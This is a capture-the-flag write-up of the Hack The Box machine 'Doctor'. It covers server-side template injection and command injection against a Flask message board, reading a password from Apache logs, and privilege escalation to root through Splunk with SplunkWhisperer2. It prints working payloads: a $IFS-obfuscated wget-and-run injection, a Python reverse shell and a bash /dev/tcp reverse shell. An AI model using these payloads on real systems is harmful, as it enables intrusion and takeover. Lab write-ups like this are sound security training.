@@ -1,0 +1,520 @@
+I"�o<blockquote>
+  <p>Doctor starts off with attacking a health service message board website where we discover two vulnerabilities, Server-side Template injection and Command injection both of which leads to initial foothold on the box. Next we discover the user has privileges to read logs, where we find a password sent over password reset url, resulting in gaining access to next user. For elevating privileges to root we exploit the Splunk Atom feed service using SplunkWhisperer2 to obtain root shell.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>Initial port scan using <code class="language-plaintext highlighter-rouge">masscan</code> &amp; <code class="language-plaintext highlighter-rouge">nmap</code> discovers three TCP ports 22, 80, 8089</p>
+
+<h4 id="masscan">masscan</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/doctor
+→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p1-65535</span>,u:1-65535 <span class="nt">--rate</span> 500 10.10.10.209 | <span class="nb">tee </span>masscan.ports
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-11-14 09:05:39 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>131070 ports/host]
+Discovered open port 22/tcp on 10.10.10.209
+Discovered open port 80/tcp on 10.10.10.209
+Discovered open port 8089/tcp on 10.10.10.209
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h4 id="nmap">nmap</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/doctor
+→ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,80,8089 10.10.10.209
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-11-14 16:37 IST
+Nmap scan report <span class="k">for </span>10.10.10.209
+Host is up <span class="o">(</span>0.076s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http     Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Doctor
+8089/tcp open  ssl/http Splunkd httpd
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: Splunkd
+|_http-title: splunkd
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SplunkServerDefaultCert/organizationName<span class="o">=</span>SplunkUser
+| Not valid before: 2020-09-06T15:57:27
+|_Not valid after:  2023-09-06T15:57:27
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>38.88 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Port Scan Summary:</p>
+
+<ul>
+  <li>Port 22 - SSH</li>
+  <li>Port 80 - HTTP Website</li>
+  <li>Port 8089 - Splunkd</li>
+</ul>
+
+<h3 id="port-8089---splunkd">Port 8089 - Splunkd</h3>
+
+<p>Visiting <a href="http://10.10.10.209:8089">http://10.10.10.209:8089</a> we see it’s an Splunk Management page running Splunk Version as 8.0.5, apart from it we don’t find anything interesting since visiting the management options request basic HTTP AUTH and we don’t have any creds. So we can look into it later once we obtain some valid credential.</p>
+
+<p><img src="/assets/img/Posts/Doctor/splunk.png" alt="splunk" /></p>
+
+<h3 id="port-80---http">Port 80 - HTTP</h3>
+
+<p>Visiting <a href="http://10.10.10.209">http://10.10.10.209</a> we get presented with a health services website. While the links on the website are non functional we do see a note for sending message to <strong>info@doctors.htb</strong></p>
+
+<p><img src="/assets/img/Posts/Doctor/website.png" alt="website" /></p>
+
+<p>Adding doctors.htb to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and visiting <a href="http://doctors.htb">http://doctors.htb</a> redirects us to <strong>Doctor Secure Messaging</strong> login page located at <code class="language-plaintext highlighter-rouge">doctors.htb/login?next=%2F</code></p>
+
+<p><img src="/assets/img/Posts/Doctor/portal.png" alt="portal" /></p>
+
+<p>Basic SQLi didn’t work but we have a sign up option which allows us to create a account which is valid for 20 minutes.</p>
+
+<p>Once logged in we see a empty page with some options to play around with:</p>
+
+<p><img src="/assets/img/Posts/Doctor/portal1.png" alt="portal1" /></p>
+
+<p>Interestingly <strong>New Message</strong> presents a form with Title and Content field, once filled and posted it appears on the home page:</p>
+
+<p><img src="/assets/img/Posts/Doctor/portal2.png" alt="portal2" /></p>
+
+<p>Visiting the source of the page we see an HTML comment referring to <code class="language-plaintext highlighter-rouge">/archive</code> which is in beta testing:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="rouge-code"><pre><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"navbar-nav mr-auto"</span><span class="nt">&gt;</span>
+              <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-item nav-link"</span> <span class="na">href=</span><span class="s">"/home"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
+              <span class="c">&lt;!--archive still under beta testing&lt;a class="nav-item nav-link" href="/archive"&gt;Archive&lt;/a&gt;--&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+            <span class="c">&lt;!-- Navbar Right Side --&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"navbar-nav"</span><span class="nt">&gt;</span>
+
+                <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-item nav-link"</span> <span class="na">href=</span><span class="s">"/post/new"</span><span class="nt">&gt;</span>New Message<span class="nt">&lt;/a&gt;</span>
+                <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-item nav-link"</span> <span class="na">href=</span><span class="s">"/account"</span><span class="nt">&gt;</span>Account<span class="nt">&lt;/a&gt;</span>
+                <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-item nav-link"</span> <span class="na">href=</span><span class="s">"/logout"</span><span class="nt">&gt;</span>Logout<span class="nt">&lt;/a&gt;</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Looking at the source of <a href="http://doctors.htb/archive">http://doctors.htb/archive</a> we see the Post title in the XML content:</p>
+
+<p><img src="/assets/img/Posts/Doctor/archive1.png" alt="archive1" /></p>
+
+<h2 id="shell-as-web">Shell as web</h2>
+
+<h3 id="method-1-ssti">Method 1: SSTI</h3>
+
+<blockquote>
+  <p>Server-Side Template Injection is possible when an attacker injects template directive as user input that can execute arbitrary code on the server. If you happen to view the source of a web page and see below code snippets then it is safe to guess that the application is using some template engine to render data.</p>
+</blockquote>
+
+<p>Looking at Wappalyzer output we can see it’s running Python framework - Flask which uses Jinja2 template engine by default which can be vulnerable to SSTI.</p>
+
+<p><img src="/assets/img/Posts/Doctor/wapp.png" alt="wapp" /></p>
+
+<p>I found this <a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee"><strong>medium article</strong></a> which explains in detail on testing and exploiting SSTI.</p>
+
+<h4 id="testing-ssti">Testing SSTI</h4>
+
+<p>PayloadsAllTheThings has a good image on methodology for testing SSTI:</p>
+
+<p><img src="/assets/img/Posts/Doctor/ssti.png" alt="ssti" /></p>
+
+<p>For testing we’ll include payload inside both title and content to see how the site responds, unfortunately we don’t see anything like 49 or 4 on first attempt:</p>
+
+<p><img src="/assets/img/Posts/Doctor/ssti1.png" alt="ssti1" /></p>
+
+<p>Second attempt didn’t work either:</p>
+
+<p><img src="/assets/img/Posts/Doctor/ssti2.png" alt="ssti2" /></p>
+
+<p>Going nowhere I stumbled upon the archive page again where we can see something really interesting:</p>
+
+<p><img src="/assets/img/Posts/Doctor/ssti3.png" alt="ssti3" /></p>
+
+<p>Apparently our SSTI did work for payloads <code class="language-plaintext highlighter-rouge">and</code> which confirms the template engine running is either Jinja2 which is the default engine for Flask or it can Twig.</p>
+
+<h4 id="reverse-shell">Reverse Shell</h4>
+
+<p>Now that we are certain of SSTI we can grab the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset"><strong>remote code execution payload</strong></a> from PayloadsAllTheThings and modify it with our IP/Port and changing the subprocess call to <code class="language-plaintext highlighter-rouge">/bin/bash -i</code> to drop us a reverse shell:</p>
+
+<p><img src="/assets/img/Posts/Doctor/payload.png" alt="payload" /></p>
+
+<p>Inputting the above payload inside title and once posted, refreshing the <code class="language-plaintext highlighter-rouge">http://doctors.htb/archive</code> page drops us a reverse shell:</p>
+
+<p><img src="/assets/img/Posts/Doctor/ssti4.png" alt="ssti4" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/doctor
+→ nc <span class="nt">-lvnp</span> 8020
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8020
+Ncat: Listening on 0.0.0.0:8020
+Ncat: Connection from 10.10.10.209.
+Ncat: Connection from 10.10.10.209:45930.
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>863<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+web@doctor:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="method-2-command-injection">Method 2: Command Injection</h3>
+
+<p>This is the unintended method to solve the box, originally I did solve the box using this method.</p>
+
+<p>While testing for possible vectors leading to RCE, I was trying random XSS payloads to understand the website response so by sending a HTML injection payload inside the title and XSS payload in the content:</p>
+
+<p><img src="/assets/img/Posts/Doctor/cmdi.png" alt="cmdi" /></p>
+
+<p>While both the payloads reflected as it is inside Posts, XSS payload inside content field did parse and we can observe a hit on the Python server:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/doctor
+→ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.209 - - <span class="o">[</span>14/Nov/2020 19:18:32] code 404, message File not found
+10.10.10.209 - - <span class="o">[</span>14/Nov/2020 19:18:32] <span class="s2">"GET /test HTTP/1.1"</span> 404 -
+10.10.10.209 - - <span class="o">[</span>14/Nov/2020 19:20:08] code 404, message File not found
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Although it’s not clear how the request was parsed at this point because the hit on the python server was received instantly as soon as post was submitted without any delay.</p>
+
+<p>To see the complete request, we’ll change the port and send the payload again as <code class="language-plaintext highlighter-rouge">&lt;img src="http://10.10.14.27:8080/test" onerror=alert(1)&gt;</code> and observe the request on the nc listener:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/doctor
+→ nc -lvnp 8080
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::8080
+Ncat: Listening on 0.0.0.0:8080
+Ncat: Connection from 10.10.10.209.
+Ncat: Connection from 10.10.10.209:32800.
+GET /test HTTP/1.1
+Host: 10.10.14.27:8080
+User-Agent: curl/7.68.0
+Accept: */*
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Interestingly, it’s showing curl as the User-agent, it appears the content field is parsing the content directly via curl command.</p>
+
+<p>On sending a simple web server link inside the content field we do see the hit again our python server, apparently there is no input validation and the content are directly parsed via Curl:</p>
+
+<p><img src="/assets/img/Posts/Doctor/cmdi1.png" alt="cmdi1" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/doctor
+→ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.209 - - <span class="o">[</span>14/Nov/2020 19:53:22] code 404, message File not found
+10.10.10.209 - - <span class="o">[</span>14/Nov/2020 19:53:22] <span class="s2">"GET /cfx HTTP/1.1"</span> 404 -
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="rce-test">RCE test</h4>
+
+<p>Next, We’ll craft our payload as <code class="language-plaintext highlighter-rouge">http://10.10.14.27/$(whoami)</code> and submit the post again, instantly we see username as web:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>10.10.10.209 - - <span class="o">[</span>14/Nov/2020 19:56:50] <span class="s2">"GET /web HTTP/1.1"</span> 404 -
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Changing the payload to <code class="language-plaintext highlighter-rouge">http://10.10.14.27/$(hostname)</code> resulted in giving the hostname as doctor:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>10.10.10.209 - - <span class="o">[</span>14/Feb/2021 19:58:04] <span class="s2">"GET /doctor HTTP/1.1"</span> 404 -
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="reverse-shell---web">Reverse Shell - Web</h4>
+
+<p>Now that we have a working RCE, our next goal should be to get a reverse shell.</p>
+
+<p>Although there are certain limitations to this method as sending complex reverse shell payloads was breaking the request as the payload didn’t like space so we have to use <code class="language-plaintext highlighter-rouge">$IFS</code> (Internal field separator) and we have to combine arguments with <code class="language-plaintext highlighter-rouge">'</code></p>
+
+<p>So instead of writing complex payloads, I decided to host a python3 reverse shell payload on the python server and call the reverse shell payload using wget and next run the script using bash:</p>
+
+<ul>
+  <li>Reverse shell payload:</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/doctor
+→ <span class="nb">cat </span>rev.bash
+python3 <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.27",8021));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<ul>
+  <li>Payload for Command Injection:</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>http://10.10.14.27/<span class="si">$(</span>wget<span class="nv">$IFS</span><span class="s1">'http://10.10.14.27/rev.bash'</span><span class="nv">$IFS</span><span class="p">;</span><span class="nv">$IFS</span><span class="s1">'bash'</span><span class="nv">$IFS</span><span class="s1">'rev.bash'</span><span class="si">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>This payload will fetch our python reverse shell file <code class="language-plaintext highlighter-rouge">rev.bash</code> and separated by <code class="language-plaintext highlighter-rouge">;</code> next command will execute dropping a reverse shell.</p>
+
+<p><img src="/assets/img/Posts/Doctor/rce.png" alt="rce" /></p>
+
+<p>On submitting the Post, we can see a hit on python server:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>10.10.10.209 - - <span class="o">[</span>14/Nov/2020 20:16:38] <span class="s2">"GET /rev.bash HTTP/1.1"</span> 200 -
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And get a call back on our nc listener:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/doctor
+→ nc <span class="nt">-lvnp</span> 8021
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::8021
+Ncat: Listening on 0.0.0.0:8021
+Ncat: Connection from 10.10.10.209.
+Ncat: Connection from 10.10.10.209:55492.
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ id
+uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+$ python3 -c "import pty;pty.spawn('</span>/bin/bash<span class="s1">')"
+web@doctor:~$
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="elevating-priv-web---shaun">Elevating Priv: web -&gt; shaun</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>Inside home directory we discover another user named shaun:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>web@doctor:/home<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 16
+drwxr-xr-x  4 root  root  4096 Sep 19 16:54 <span class="nb">.</span>
+drwxr-xr-x 20 root  root  4096 Sep 15 12:51 ..
+drwxr-xr-x  6 shaun shaun 4096 Sep 15 12:51 shaun
+drwxr-xr-x  7 web   web   4096 Feb 14 16:47 web
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">user.txt</code> is located inside shaun’s home directory and is only readable by shaun.</p>
+
+<p>Next we find, Web user is a member of <code class="language-plaintext highlighter-rouge">adm</code> group which allows us to read log files in <code class="language-plaintext highlighter-rouge">/var/log/</code> directory:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>web@doctor:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Going through the apache2 log files, we will grep for password where we discover a password <code class="language-plaintext highlighter-rouge">Guitar123</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>web@doctor:/var/log/apache2<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> password
+<span class="nb">grep</span> <span class="nt">-r</span> password
+backup:10.10.14.4 - - <span class="o">[</span>05/Sep/2020:11:17:34 +2000] <span class="s2">"POST /reset_password?email=Guitar123"</span> 500 453 <span class="s2">"http://doctor.htb/reset_password"</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="su---shaun">Su - shaun</h3>
+
+<p>Turns out <code class="language-plaintext highlighter-rouge">Guitar123</code> is shaun’s password:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>web@doctor:/home/shaun<span class="nv">$ </span>su shaun
+Password: Guitar123
+shaun@doctor:~<span class="err">$</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Grabbing <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>shaun@doctor:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+8bb491643e3fe3<span class="k">******************</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="elevating-priv-shaun---root">Elevating Priv: shaun -&gt; root</h2>
+
+<p>Initial enumeration did reveal a splunkd service hosted on Port 8089 running version 8.0.5</p>
+
+<p>On searching for Splunk Privilege escalation exploit we stumble upon <a href="https://github.com/cnotin/SplunkWhisperer2"><strong>SplunkWhisperer2</strong></a> using which we can achieve privilege escalation or remote code execution</p>
+
+<h3 id="root-shell">Root shell</h3>
+
+<p>We’ll clone the repo on our machine and run the Python script along with shaun’s creds:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2  |master ✓|
+→ python3 PySplunkWhisperer2_remote.py <span class="nt">--host</span> 10.10.10.209 <span class="nt">--lhost</span> 10.10.14.27 <span class="nt">--username</span> shaun <span class="nt">--password</span> Guitar123 <span class="nt">--payload</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.27/4444 0&gt;&amp;1'"</span>
+Running <span class="k">in </span>remote mode <span class="o">(</span>Remote Code Execution<span class="o">)</span>
+<span class="o">[</span>.] Authenticating...
+<span class="o">[</span>+] Authenticated
+<span class="o">[</span>.] Creating malicious app bundle...
+<span class="o">[</span>+] Created malicious app bundle <span class="k">in</span>: /tmp/tmpq0qs909h.tar
+<span class="o">[</span>+] Started HTTP server <span class="k">for </span>remote mode
+<span class="o">[</span>.] Installing app from: http://10.10.14.27:8181/
+10.10.10.209 - - <span class="o">[</span>14/Nov/2020 21:48:42] <span class="s2">"GET / HTTP/1.1"</span> 200 -
+<span class="o">[</span>+] App installed, your code should be running now!
+
+Press RETURN to cleanup
+
+<span class="o">[</span>.] Removing app...
+<span class="o">[</span>+] App removed
+<span class="o">[</span>+] Stopped HTTP server
+Bye!
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Getting a callback on <code class="language-plaintext highlighter-rouge">nc</code> listener:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/doctor
+→ nc <span class="nt">-lvnp</span> 4444
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.10.209.
+Ncat: Connection from 10.10.10.209:42392.
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1143<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+root@doctor:/# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@doctor:/# <span class="nb">whoami
+</span>root
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Grabbing <code class="language-plaintext highlighter-rouge">root.txt</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre>root@doctor:/root# <span class="nb">cat </span>root.txt
+5df27170d99d58b<span class="k">*****************</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And we pwned the Box !</p>
+
+<p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p>
+:ET
